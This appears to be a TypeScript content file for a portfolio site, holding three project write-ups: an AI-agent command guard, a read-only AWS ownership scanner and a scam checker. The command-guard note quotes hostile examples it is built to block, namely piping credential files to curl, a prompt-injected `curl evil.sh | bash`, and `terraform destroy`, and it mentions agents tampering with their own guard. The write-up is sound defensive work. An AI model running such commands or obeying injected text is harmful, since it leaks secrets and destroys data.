// Engineering notes. Each one is a write-up of one of Nikhil's open-source projects, taken only
// from that project's own README (linked as the source), so nothing here goes beyond what he has
// published. Notes are in English on both language editions.

export type Block =
  | { type: "p"; text: string }
  | { type: "h2"; text: string }
  | { type: "list"; items: string[] }
  | { type: "code"; text: string }
  | { type: "quote"; text: string };

export type Note = {
  slug: string;
  title: string;
  summary: string;
  date: string; // ISO date the project was first published
  tags: string[];
  source: string; // README the note is based on
  body: Block[];
};

export const notes: Note[] = [
  {
    slug: "seatbelt-for-ai-agents",
    title: "A seatbelt for AI coding agents",
    summary:
      "Agents now run aws, kubectl, terraform and git on real machines. seatbelt reads each shell command before it runs and stops the dangerous ones, without a network call.",
    date: "2026-10-19",
    tags: ["AI safety", "DevSecOps", "Python"],
    source: "https://github.com/nikhilrai-tech/seatbelt-for-AI-agents",
    body: [
      {
        type: "p",
        text: "An AI agent can `terraform destroy` production, `cat ~/.aws/credentials | curl ...`, or `git push --force origin main`. seatbelt reads the command first and stops it.",
      },
      { type: "h2", text: "The problem" },
      {
        type: "p",
        text: "People now let agents run aws, kubectl, terraform, git and SQL on their machines. The fears are concrete: something gets deleted, something can't be undone, secrets leak, a README prompt-injects `curl evil.sh | bash`, a command hides what it does behind base64, and afterwards nobody knows what ran.",
      },
      { type: "h2", text: "It understands the command instead of grepping it" },
      {
        type: "p",
        text: 'seatbelt parses pipes, `&&`, subshells, `sudo`, `bash -c`, `eval`, `ssh host "..."`, `kubectl exec`, `xargs`, `find -exec`, here-docs and quoting tricks. `cd` is tracked, so `cd /etc && rm -rf *` is judged in /etc. Each command gets one verdict: ALLOW (silent), ASK or DENY.',
      },
      {
        type: "list",
        items: [
          'Fails closed: a computed command name, `eval "$X"` or an unbalanced quote becomes an ASK, not a guess. A fuzz test checks the engine never raises, because a crashing hook would let the command through.',
          "Follows secrets: `cat .env | curl -d @- https://...` is denied; reading credential files asks.",
          "Reads scripts the agent just wrote, including paths built with `os.path.join`.",
          "Protects itself: editing the agent's settings, seatbelt's config or audit log, or uninstalling it is denied.",
        ],
      },
      { type: "h2", text: "Production is detected, not assumed" },
      {
        type: "p",
        text: "Deleting a dev namespace and deleting prod are different acts. seatbelt works out where a command runs from flags like `--profile prod` or `-n production`, from `AWS_PROFILE`, `TF_WORKSPACE`, kubeconfig's current context, terraform's workspace file or an `infra/prod/` directory. Changes in production ask; destroying production for good (`kubectl delete ns`, `DROP TABLE`, `terraform destroy`, `terraform apply -auto-approve`) is denied.",
      },
      { type: "h2", text: "It shows what a delete would touch" },
      {
        type: "p",
        text: "Before asking about `rm -rf src`, it measures the target: file and folder counts, size, whether `.git` is inside, how much changed in the last 24 hours, and files that usually aren't in version control such as `.env` or local databases. It never runs git or kubectl to find out, because running git inside a freshly cloned repository can execute that repository's own config.",
      },
      {
        type: "code",
        text: "ASK   rm -rf src\n        - recursive delete of /home/me/app/src  [fs.rm.recursive]\n        = impact: deletes 27 files in 2 folders (1.4 MB) ...",
      },
      { type: "h2", text: "Fewer prompts, without loosening blindly" },
      {
        type: "p",
        text: "`seatbelt learn` reads the audit log and suggests narrow allow rules for prompts you approved at least three times, and only if re-running the examples through the real engine gives ALLOW. Secrets, production, tampering and anything it can't verify are never suggested.",
      },
      { type: "h2", text: "What it is not" },
      {
        type: "quote",
        text: "seatbelt is a guardrail, not a sandbox. It cannot follow a value through variables or see what `make` or an MCP tool does internally. For a hard guarantee, run the agent in a container or VM, and use seatbelt on top of it.",
      },
      {
        type: "p",
        text: "Zero dependencies, no network code, no telemetry, about 60 ms per command. Install with `pipx install seatbelt-guard` and `seatbelt install claude-code --write`; `seatbelt doctor` proves the hook is live.",
      },
    ],
  },
  {
    slug: "cloud-ownerlens",
    title: "Finding the owner of forgotten cloud resources",
    summary:
      "Cost tools say what's expensive. cloud-ownerlens finds unused resources, works out who owns them, records what they answered, and can't change anything.",
    date: "2026-10-18",
    tags: ["FinOps", "AWS", "Python"],
    source: "https://github.com/nikhilrai-tech/cloud-ownerlens",
    body: [
      {
        type: "p",
        text: 'Every cloud account collects stopped VMs, unattached disks, idle NAT gateways and snapshots of volumes that no longer exist. Cost tools say they are expensive. They don\'t say who owns them, what that person answered, or whether a backup exists. And owners rarely say "delete it": they say "we might need it later".',
      },
      { type: "h2", text: "Three questions per resource" },
      {
        type: "list",
        items: [
          "Is it unused? A zombie score from CloudWatch metrics and resource state.",
          "Who owns it? Tags, people named in Name tags and the CloudTrail creator, combined into a confidence score.",
          "What should happen? keep, ask-owner, or propose-cleanup.",
        ],
      },
      { type: "h2", text: "It cannot change your infrastructure" },
      {
        type: "p",
        text: "Every AWS call goes through a guard that only allows Describe, Get, List and Lookup operations; anything else raises before it is sent. There is no delete, stop or tag code in the repository, and a test fails if one is added. propose-cleanup is only a label in a report, and resources tagged production or managed by Kubernetes are capped at ask-owner.",
      },
      { type: "h2", text: "Ownership is evidence, not a guess" },
      {
        type: "p",
        text: "Signals are combined as independent evidence, confidence = 1 − ∏(1 − weight): an owner tag counts 0.80, a team or project tag 0.50, a human CloudTrail creator 0.50, a Name tag that mentions a known user 0.45, an automation creator 0.15. If two different people both reach 40%, the finding is flagged as a conflict, because the creator is not always the owner.",
      },
      { type: "h2", text: "Recording what owners say" },
      {
        type: "code",
        text: 'ownerlens decide i-0123abc --by alice --reason "training box, needed again in Q1" --review-days 90\nownerlens verify-backup --pending',
      },
      {
        type: "p",
        text: 'Kept resources stop being nagged about and come back when the review date passes. "Back it up, then delete" is recorded as a condition, and `verify-backup` checks, read-only, that every volume has a completed snapshot. The tool never deletes or snapshots anything: a person does, after the owner confirms in writing.',
      },
      { type: "h2", text: "Reports people can act on" },
      {
        type: "p",
        text: "A scan writes a management summary, a findings CSV/JSON, a triage list of unowned resources, one draft message per owner, and a runbook for agreed deletions. Messages to owners on Slack or email are a dry run unless you pass --send and type to confirm.",
      },
      {
        type: "quote",
        text: "GCP and Azure support is experimental and tested against recorded CLI output only. The README lists every known limit.",
      },
    ],
  },
  {
    slug: "scamsaathi",
    title: "ScamSaathi: an offline scam shield in Hindi and English",
    summary:
      "A scam check for the people scammers target most: farmers, students and their families. It runs on the phone, explains why, and can tell someone you trust.",
    date: "2026-10-19",
    tags: ["Security", "Flutter", "Django"],
    source: "https://github.com/nikhilrai-tech/ScamSaathi",
    body: [
      {
        type: "p",
        text: 'Every day people in India lose money to a fake "PM-Kisan.apk", an "RTO challan" file, a "KYC update" link, a UPI collect request or a fake scholarship, usually on WhatsApp or SMS, in a regional language, while they are alone. ScamSaathi checks a message, link or app name on the phone itself, in Hindi or English, explains why, and can tell someone you trust.',
      },
      { type: "h2", text: "Three ideas built together" },
      {
        type: "list",
        items: [
          "Share-to-check: share a message from WhatsApp or SMS and get plain-language reasons, with a Listen button for people who read slowly. A suspicious .apk shows what it asks for (read SMS and OTPs, read the screen) without being installed.",
          "Offline and private by default: detection runs on the phone from signed rule packs. The message is never uploaded; reporting is opt-in and sends only hashes.",
          "The Saathi loop: name someone you trust; when something looks dangerous the app drafts them a short note that never contains the message, a link or a number.",
        ],
      },
      { type: "h2", text: "How it decides" },
      {
        type: "list",
        items: [
          "Rules are data: phrases, link features and weights live in a pack, with every explanation in English and Hindi. A Dart and a Python engine must pass the same golden corpus, so they cannot drift.",
          'A small character n-gram model notices wording that is merely similar to scams; it can warn but never alone says "dangerous".',
          'No single clue is enough: at least two rules must agree. Nothing is ever called "safe"; a quiet result says "no warning signs found".',
          "Signed updates fail closed: packs are signed with Ed25519, and the app and server reject missing, tampered or older packs.",
        ],
      },
      { type: "h2", text: "Honest numbers" },
      {
        type: "quote",
        text: "Early release (v0.2). On a fresh, made-up test set it flagged 27 of 36 scams (75%) and 1 of 36 normal messages (2.8%). It has not been tested on real WhatsApp traffic, so every result is a strong hint, never proof.",
      },
      {
        type: "p",
        text: "Institutions such as a school, farmer-producer organisation or cooperative bank get a dashboard of what is circulating in their district and can publish verified alerts, without ever seeing messages or people. If you lost money, call 1930 or report at cybercrime.gov.in.",
      },
    ],
  },
];

export const readingMinutes = (note: Note) =>
  Math.max(
    2,
    Math.round(
      note.body
        .map((b) => ("text" in b ? b.text : b.items.join(" ")))
        .join(" ")
        .split(/\s+/).length / 220,
    ),
  );
